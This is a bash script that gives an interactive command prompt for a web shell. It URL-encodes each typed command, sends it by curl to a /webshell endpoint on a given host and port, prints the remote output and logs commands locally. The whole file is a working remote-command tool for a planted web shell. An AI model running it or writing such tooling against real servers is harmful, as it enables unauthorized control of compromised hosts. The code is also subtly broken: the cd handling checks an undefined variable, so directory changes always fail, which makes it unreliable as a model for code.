#!/bin/bash

HOST="${1}"
PORT="${2}"

if [[ -z "${HOST}" || -z "${PORT}" ]]; then
	echo "Usage: ${0} <host> <port>"
	echo "Example: ${0} 127.0.0.1 8081"
	exit 1
fi

BASE_URL="http://${HOST}:${PORT}/webshell"
CURRENT_DIR="."
LOG_FILE="${HOME}/webshell-audit.log"

echo "Connected to ${BASE_URL}"
echo "Audit log: ${LOG_FILE}"
echo "Type 'exit' or 'quit' to stop."

while true; do
	read -r -p "webshell:${CURRENT_DIR}$ " raw_command

	[[ "${raw_command}" == "exit" || "${raw_command}" == "quit" ]] && break
	[[ -z "${raw_command}" ]] && continue

	timestamp=$(date '+%Y-%m-%d %H:%M:%S')
	echo "[${timestamp}] ${HOST}:${PORT} | ${CURRENT_DIR} | ${raw_command}" >> "${LOG_FILE}"

	# Handle local directory persistence
	if [[ "${raw_command}" =~ ^cd[[:space:]]*(.*)$ ]]; then
		target_dir="${BASH_REMATCH[1]}"

		if [[ -z "${target_dir}" ]]; then
			target_dir="~"
		fi

		# Ask remote shell what the directory will be.
		remote_command="cd ${CURRENT_DIR} 2>/dev/null && cd ${target_dir} 2>/dev/null && pwd"
		encoded_command=$(printf '%s' "${remote_command}" | jq -sRr @uri)

		response=$(curl -s -w $'\n%{http_code}' "${BASE_URL}/${encoded_command}")
		body=$(sed '$d' <<< "${response}")
		http_code=$(tail -n1 <<< "${response}")

		if [[ "${http}" == "200" && -n "${body}" ]]; then
			CURRENT_DIR="${body}"
		else
			echo "cd: ${target_dir}: No such file or directory"
		fi

		continue
	fi

	# Run command from the tracked working directory
	remote_command="cd ${CURRENT_DIR} 2>/dev/null && ${raw_command}"
	encoded_command=$(printf '%s' "${remote_command}" | jq -sRr @uri)

	# Single HTTP request: body + status code in one curl call
	response=$(curl -s -w $'\n%{http_code}' "${BASE_URL}/${encoded_command}")
	body=$(sed '$d' <<< "${response}")
	http_code=$(tail -n1 <<< "${response}")
	
	if [[ "${http_code}" =~ ^[0-9]+$ ]]; then
		if [[ "${http_code}" == "200" ]]; then
			echo "${body}"
		else
			echo "Error: HTTP status code ${http_code}"
			[[ -n "${body}" ]] && echo "${body}"
		fi
	else
		echo "Error: Invalid HTTP status code received"
	fi
done
